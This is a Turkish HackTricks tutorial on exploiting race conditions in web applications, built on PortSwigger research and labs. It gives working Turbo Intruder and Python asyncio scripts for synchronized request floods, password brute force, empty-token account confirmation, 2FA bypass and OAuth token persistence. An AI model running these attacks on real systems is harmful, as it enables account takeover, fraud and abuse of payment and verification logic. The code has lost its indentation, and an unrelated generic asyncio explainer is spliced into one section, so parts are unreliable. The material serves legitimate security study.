# Yarış Koşulu

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kullanarak dünyanın en gelişmiş topluluk araçları tarafından desteklenen iş akışlarını kolayca oluşturabilir ve otomatikleştirebilirsiniz.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahramana kadar AWS hackleme öğrenin<strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklam vermek** veya HackTricks'i **PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz olan [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'da takip edin.**
* Hacking hilelerinizi [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR göndererek paylaşın.

</details>

{% hint style="warning" %}
Bu teknik hakkında derin bir anlayış elde etmek için orijinal raporu [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine) adresinden kontrol edin.
{% endhint %}

## Yarış Koşulu Saldırılarını Geliştirme

Yarış koşullarından faydalanmanın temel engeli, birden fazla isteğin aynı anda, **çok az farkla işlenmesini sağlamaktır - ideal olarak, 1 ms'den az**.

Burada İstekleri Senkronize Etme Tekniklerini bulabilirsiniz:

#### HTTP/2 Tek Paket Saldırısı vs. HTTP/1.1 Son-Byte Senkronizasyonu

- **HTTP/2**: Bir TCP bağlantısı üzerinden iki istek göndermeyi destekler, ağ dalgalanması etkisini azaltır. Ancak, sunucu tarafındaki değişkenler nedeniyle, iki istek tutarlı bir yarış koşulu saldırısı için yeterli olmayabilir.
- **HTTP/1.1 'Son-Byte Senkronizasyonu'**: 20-30 isteğin çoğu kısmını önceden göndermeyi sağlar, küçük bir parçayı tutarak birlikte gönderilmesini sağlar ve sunucuya aynı anda ulaşmayı başarır.

**Son-Byte Senkronizasyonu için Hazırlık** aşağıdakileri içerir:
1. Başlık ve gövde verilerini, akışı sonlandırmadan son bayt hariç gönderme.
2. İlk gönderimden sonra 100 ms beklemek.
3. Son çerçeveleri toplu işlem yapmak için TCP_NODELAY'i devre dışı bırakmak.
4. Bağlantıyı ısıtmak için ping göndermek.

Tutulan çerçevelerin sonraki gönderimi, Wireshark üzerinden tek bir pakette ulaşmalarını sağlamalıdır. Bu yöntem, genellikle RC saldırılarıyla ilişkili olmayan statik dosyalara uygulanmaz.

### Sunucu Mimarisiyle Uyum Sağlama

Hedefin mimarisini anlamak önemlidir. Ön uç sunucuları istekleri farklı yönlendirebilir ve zamanlamayı etkileyebilir. Önemsiz istekler aracılığıyla önceden sunucu tarafı bağlantı ısıtma, istek zamanlamasını normalize edebilir.

#### Oturum Tabanlı Kilitlenmeyi Aşma

PHP'nin oturum işleyicisi, oturum başına istekleri seri hale getirerek zafiyetleri gizleyebilir. Her istek için farklı oturum belirteçleri kullanmak, bu sorunu aşmanıza yardımcı olabilir.

#### Hız veya Kaynak Sınırlarını Aşma

Bağlantı ısıtma etkisiz ise, web sunucularının hız veya kaynak sınırlarını kasıtlı olarak tetiklemek için sahte isteklerin bir seli, yarış koşullarına uygun bir sunucu tarafı gecikmeyi kolaylaştırabilir.


## Saldırı Örnekleri

* **Tubo Intruder - HTTP2 tek paket saldırısı (1 uç nokta)**: İsteği **Turbo intruder**'a gönderebilirsiniz (`Extensions` -> `Turbo Intruder` -> `Send to Turbo Intruder`), istekte **`%s`** gibi brute force yapmak istediğiniz değeri **`csrf=Bn9VQB8OyefIs3ShR2fPESR0FzzulI1d&username=carlos&password=%s`** şeklinde değiştirebilir ve ardından açılır menüden **`examples/race-single-packer-attack.py`**'yi seçebilirsiniz:

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Farklı değerler gönderecekseniz, panodan bir kelime listesi kullanan aşağıdaki kodu değiştirebilirsiniz:
```python
passwords = wordlists.clipboard
for password in passwords:
engine.queue(target.req, password, gate='race1')
```
{% hint style="warning" %}
Eğer web HTTP2'yi desteklemiyorsa (sadece HTTP1.1), `Engine.BURP2` yerine `Engine.THREADED` veya `Engine.BURP` kullanın.
{% endhint %}

* **Tubo Intruder - HTTP2 tek paket saldırısı (Çeşitli uç noktalar)**: RCE'yi tetiklemek için 1 uç noktaya istek göndermeniz ve ardından diğer uç noktalara birden fazla istek göndermeniz gerekiyorsa, `race-single-packet-attack.py` betiğini aşağıdaki gibi değiştirebilirsiniz:
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=1,
engine=Engine.BURP2
)

# Hardcode the second request for the RC
confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a9c00370490e77e837419c4005900d0.web-security-academy.net
Cookie: phpsessionid=MpDEOYRvaNT1OAm0OtAsmLZ91iDfISLU
Content-Length: 0

'''

# For each attempt (20 in total) send 50 confirmation requests.
for attempt in range(20):
currentAttempt = str(attempt)
username = 'aUser' + currentAttempt

# queue a single registration request
engine.queue(target.req, username, gate=currentAttempt)

# queue 50 confirmation requests - note that this will probably sent in two separate packets
for i in range(50):
engine.queue(confirmationReq, gate=currentAttempt)

# send all the queued requests for this attempt
engine.openGate(currentAttempt)
```
* Ayrıca, Burp Suite'deki yeni '**Paralel olarak grup gönder**' seçeneğiyle **Repeater** üzerinde de mevcuttur.
* **Limit aşımı** için, grup içine **aynı isteği 50 kez** ekleyebilirsiniz.
* **Bağlantı ısınması** için, web sunucusunun statik olmayan bir bölümüne bazı istekler ekleyebilirsiniz. Bu istekleri grup başına ekleyin.
* İki alt durum adımı arasında işlem yapma sürecini **geciktirmek** için, her iki istek arasına **ekstra istekler ekleyebilirsiniz**.
* **Çoklu uç nokta** RC için, **gizli duruma giden isteği** göndermeye başlayabilir ve ardından **gizli durumu** sömüren **50 istek** gönderebilirsiniz.

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Ham BF

Önceki araştırmadan önce, bir RC'ye neden olmak için paketleri mümkün olduğunca hızlı bir şekilde göndermeye çalışan bazı payloadlar kullanılmıştır.

* **Repeater:** Önceki bölümdeki örnekleri kontrol edin.
* **Intruder**: **İsteği Intruder'a** gönderin, **Seçenekler** menüsünde **iş parçacığı sayısını 30** olarak ayarlayın ve payload olarak **Boş payloadlar** seçin ve **30** oluşturun.
* **Turbo Intruder**
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
pipeline=False
)
a = ['Session=<session_id_1>','Session=<session_id_2>','Session=<session_id_3>']
for i in range(len(a)):
engine.queue(target.req,a[i], gate='race1')
# open TCP connections and send partial requests
engine.start(timeout=10)
engine.openGate('race1')
engine.complete(timeout=60)

def handleResponse(req, interesting):
table.add(req)
```
* **Python - asyncio**

Python'da `asyncio` modülü, asenkron programlama için kullanılan bir kütüphanedir. Bu modül, bir dizi asenkron işlemi yönetmek için kullanılan bir event loop (etkinlik döngüsü) sağlar. `asyncio` kullanarak, aynı anda birden fazla işlemi eşzamanlı olarak çalıştırabilir ve böylece performansı artırabilirsiniz.

`asyncio` modülü, `async` ve `await` anahtar kelimelerini kullanarak asenkron işlemleri tanımlamanıza olanak tanır. `async` anahtar kelimesi, bir fonksiyonun asenkron olarak çalıştırılacağını belirtirken, `await` anahtar kelimesi, bir işlemin tamamlanmasını beklemek için kullanılır.

Aşağıda, `asyncio` kullanarak basit bir örnek verilmiştir:

```python
import asyncio

async def my_coroutine():
    print("Başlangıç")

    await asyncio.sleep(1)
    print("1 saniye bekledikten sonra")

    await asyncio.sleep(2)
    print("2 saniye bekledikten sonra")

    print("Son")

asyncio.run(my_coroutine())
```

Bu örnekte, `my_coroutine` adlı bir asenkron fonksiyon tanımlanmıştır. Bu fonksiyon, `await asyncio.sleep()` kullanarak belirli bir süre beklemektedir. `asyncio.run()` fonksiyonu ise asenkron fonksiyonu çalıştırmak için kullanılmaktadır.

Bu şekilde, `asyncio` kullanarak asenkron programlama yapabilir ve işlemleri daha verimli bir şekilde yönetebilirsiniz.
```python
import asyncio
import httpx

async def use_code(client):
resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
return resp.text

async def main():
async with httpx.AsyncClient() as client:
tasks = []
for _ in range(20): #20 times
tasks.append(asyncio.ensure_future(use_code(client)))

# Get responses
results = await asyncio.gather(*tasks, return_exceptions=True)

# Print results
for r in results:
print(r)

# Async2sync sleep
await asyncio.sleep(0.5)
print(results)

asyncio.run(main())
```
## **RC Metodolojisi**

### Sınırlama Aşımı / TOCTOU

Bu, bir eylemi belirli bir sayıda gerçekleştirebileceğiniz yerlerde ortaya çıkan **zayıflıkların** en temel türüdür. Örneğin, aynı indirim kodunu bir web mağazasında birden fazla kez kullanmak gibi. Çok basit bir örnek [**bu raporda**](https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43) veya [**bu hatada**](https://hackerone.com/reports/759247)** bulunabilir**.

Bu tür saldırının birçok varyasyonu vardır, bunlar arasında:

* Bir hediye kartını birden fazla kez kullanmak
* Bir ürüne birden fazla kez puan vermek
* Hesap bakiyenizden fazla para çekmek veya transfer etmek
* Tek bir CAPTCHA çözümünü tekrar kullanmak
* Bir anti-brute-force hız sınırlamasını aşmak

### **Gizli alt durumlar**

Karmaşık yarış koşullarını sömürmek genellikle gizli veya **istenmeyen makine alt durumlarıyla** etkileşim fırsatlarından yararlanmayı içerir. İşte bunu nasıl ele alacağınız:

1. **Potansiyel Gizli Alt Durumları Belirleme**
- Kullanıcı profilleri veya şifre sıfırlama süreçleri gibi önemli verileri değiştiren veya etkileşime giren uç noktaları belirleyerek başlayın. Odaklanmanız gereken noktalar:
- **Depolama**: Sunucu tarafında kalıcı verileri işleyen uç noktaları, istemci tarafında veri işleyenlere tercih edin.
- **Eylem**: Var olan verileri değiştiren işlemleri arayın, bunlar yeni veri eklemekten daha fazla sömürülebilir koşullar yaratma eğilimindedir.
- **Anahtarlama**: Başarılı saldırılar genellikle aynı tanımlayıcıya (kullanıcı adı veya sıfırlama belirteci gibi) dayalı işlemleri içerir.

2. **İlk Araştırmayı Yapma**
- Belirlenen uç noktaları yarış koşulu saldırılarıyla test ederek beklenen sonuçlardan herhangi bir sapma olup olmadığını gözlemleyin. Beklenmeyen yanıtlar veya uygulama davranışındaki değişiklikler bir zayıflık işareti olabilir.

3. **Zayıflığı Gösterme**
- Saldırıyı, genellikle sadece iki istek gerektiren minimum sayıya daraltın. Bu adım, hassas zamanlama nedeniyle birden fazla deneme veya otomasyon gerektirebilir.

### Zaman Hassas Saldırılar

İsteklerin zamanlamasında hassasiyet, özellikle güvenlik belirteçleri için zaman damgaları gibi tahmin edilebilir yöntemler kullanıldığında zayıflıkları ortaya çıkarabilir. Örneğin, zaman damgalarına dayalı şifre sıfırlama belirteçleri, eşzamanlı istekler için aynı belirteçlere izin verebilir.

**Sömürmek için:**
- Eşzamanlı şifre sıfırlama istekleri yapmak için tek paket saldırısı gibi hassas zamanlama kullanın. Eşleşen belirteçler, bir zayıflık olduğunu gösterir.

**Örnek:**
- Aynı anda iki şifre sıfırlama belirteci isteyin ve karşılaştırın. Eşleşen belirteçler, belirteç oluşturma işleminde bir hata olduğunu gösterir.

**Bunu denemek için bu [PortSwigger Lab](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities)'e bakın.**


## Gizli alt durumlar örnekleri

### Ödeme yap ve bir öğe ekle

Bu [**PortSwigger Lab**](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation)'a bakarak bir mağazada **ödeme yapın** ve **ödemek zorunda kalmadan** ekstra bir öğe ekleyin.

### Diğer e-postaları onayla

Fikir, bir e-posta adresini doğrulamak ve aynı anda farklı bir adrese değiştirmektir, böylece platformun yeni adresi doğrulayıp doğrulamadığını öğrenebilirsiniz.

### 2 e-posta adresine dayalı e-posta değiştirme

[**Bu araştırmaya**](https://portswigger.net/research/smashing-the-state-machine) göre Gitlab, bu şekilde bir ele geçirmeye karşı savunmasızdı çünkü bir e-postanın e-posta doğrulama belirteci başka bir e-postaya **gönderilebilirdi**.

**Bunu denemek için bu [PortSwigger Lab](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint)'e bakın.**

### Gizli Veritabanı durumları / Onayı Geçme

Eğer bir veritabanına **2 farklı yazma** kullanılıyorsa, veritabanına sadece ilk verinin yazıldığı küçük bir zaman dilimi vardır. Örneğin, bir kullanıcı oluşturulurken **kullanıcı adı** ve **şifre** yazılabilir ve ardından yeni oluşturulan hesabı onaylamak için **belirteç** yazılır. Bu, bir süre için **bir hesabı onaylamak için belirtecin boş olduğu** anlamına gelir.

Bu nedenle, bir hesap kaydetmek ve hemen hesabı onaylamak için boş bir belirteçle (`token=` veya `token[]=` veya başka bir varyasyon) birkaç istek göndermek, kontrolünüz altında olmayan bir e-postayı onaylamaya izin verebilir.

**Bunu denemek için bu [PortSwigger Lab](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction)'e bakın.**

### 2FA'yı Geçme

Aşağıdaki sözdizimi kodu, oturum oluşturulurken çok kısa bir süre boyunca **2FA'nın uygulanmadığı** için yarış koşuluna karşı savunmasızdır:
```python
session['userid'] = user.userid
if user.mfa_enabled:
session['enforce_mfa'] = True
# generate and send MFA code to user
# redirect browser to MFA code entry form
```
### OAuth2 sonsuz kalıcılık

Birkaç [**OAuth sağlayıcı**](https://en.wikipedia.org/wiki/List\_of\_OAuth\_providers) bulunmaktadır. Bu hizmetler, sağlayıcının kaydettiği kullanıcıları doğrulamanıza ve bir uygulama oluşturmanıza izin verir. Bunun için **istemci**, **uygulamanıza** OAuth sağlayıcısı içindeki bazı verilere erişim izni vermelidir.\
Yani, buraya kadar sadece google/linkedin/github... ile yapılan ortak bir giriş işlemi, size "_Uygulama \<InsertCoolName>, bilgilerinize erişmek istiyor, izin vermek istiyor musunuz?_" şeklinde bir sayfa ile karşılaşırsınız.

#### `authorization_code` içindeki Yarış Koşulu

**Sorun**, bunu **kabul ettiğinizde** ve otomatik olarak **zararlı uygulamaya bir `authorization_code`** gönderildiğinde ortaya çıkar. Ardından, bu uygulama, **`authorization_code`** içinden hesabınız için birden fazla AT/RT (_Kimlik Doğrulama Jetonu/Yenileme Jetonu_) oluşturmak için OAuth hizmet sağlayıcısında bir Yarış Koşulunu kötüye kullanır. Temel olarak, uygulamanın verilerinize erişim izni vermenizi kabul ettiğiniz gerçeğini kötüye kullanacak ve **birkaç hesap oluşturacaktır**. Ardından, eğer **uygulamanın verilerinize erişim iznini durdurursanız, bir çift AT/RT silinecek, ancak diğerleri hala geçerli olacaktır**.

#### `Refresh Token` içindeki Yarış Koşulu

Geçerli bir RT'yi **edinmişseniz**, onu kötüye kullanarak birçok AT/RT oluşturmayı deneyebilirsiniz ve hatta kullanıcı, zararlı uygulamanın verilerine erişim iznini **iptal etse bile birkaç RT hala geçerli olacaktır**.

## **WebSockets'te Yarış Koşulu**

[**WS\_RaceCondition\_PoC**](https://github.com/redrays-io/WS\_RaceCondition\_PoC) adresinde, **Web Sockets'te de Yarış Koşullarını** kötüye kullanmak için **paralel** olarak websocket mesajları göndermek için bir Java PoC bulabilirsiniz.

## Referanslar

* [https://hackerone.com/reports/759247](https://hackerone.com/reports/759247)
* [https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html](https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html)
* [https://hackerone.com/reports/55140](https://hackerone.com/reports/55140)
* [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
* [https://portswigger.net/web-security/race-conditions](https://portswigger.net/web-security/race-conditions)

<details>

<summary><strong>AWS hackleme konusunda sıfırdan kahramana dönüşmek için</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>'ı öğrenin!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **tanıtmak veya HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz olan [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi Twitter'da takip edin 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live).
* Hacking hilelerinizi paylaşarak HackTricks ve HackTricks Cloud github depolarına PR göndererek katkıda bulunun.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Dünyanın en gelişmiş topluluk araçları tarafından desteklenen **iş akışlarını kolayca oluşturup otomatikleştirmek** için [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)'i kullanın.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
